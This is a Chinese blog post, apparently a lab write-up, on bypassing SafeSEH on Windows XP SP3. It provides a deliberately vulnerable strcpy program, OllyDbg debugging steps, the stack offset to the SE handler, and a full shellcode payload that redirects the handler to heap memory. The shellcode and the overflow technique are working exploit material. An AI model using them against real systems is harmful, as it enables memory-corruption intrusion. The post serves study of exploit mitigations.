---
layout:		post
title:		从堆中绕过SafeS.E.H
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

新建一个工程, 贴入以下代码

```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

void test(char *input)
{
	char str[200];
	strcpy(str,input);
	int zero=0;
	zero=1/zero;
}

int main()
{
	char *buf=(char *)malloc(500);
	__asm int 3
	strcpy(buf,shellcode);
	test(shellcode);

	return 0;
}
```

项目->属性, 选择release版本, 禁用优化


### 0x01 分析

运行*.exe, OllyDbg自动附加调试, 调用完malloc后断下

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x00.png)

查看malloc返回的堆块地址, eax=0x003929d0

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x01.png)

直接F4跳到这里, 完成了strcpy

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x02.png)

内存区goto 0x003929d0, 这里是copy到堆的数据

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x03.png)

继续单步跟入test函数, F4跳到这里, 完成strcpy

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x04.png)

可以看到输入数据的起始栈地址0x0012fe8c

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x05.png)

定位到栈上最近的S.E.H结构, SE Handler的栈地址0x0012ffb4, 0x0012ffb4-0x0012fe8c=296 byte


### 0x02 exploit

利用safeS.E.H的缺陷, 即使S.E.H不可信, 对于指向堆区的Handler仍然会调用。
组织300 byte的shellcode, 覆盖掉栈上的SE Handler, 指向copy到堆块上的shellcode

```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\xd0\x29\x39\x00";
```

注释掉int 3断点, 再编译运行, pwn~

![](/assets/img/exploit/2017-10-03-safeseh-break-byheap/0x06.png)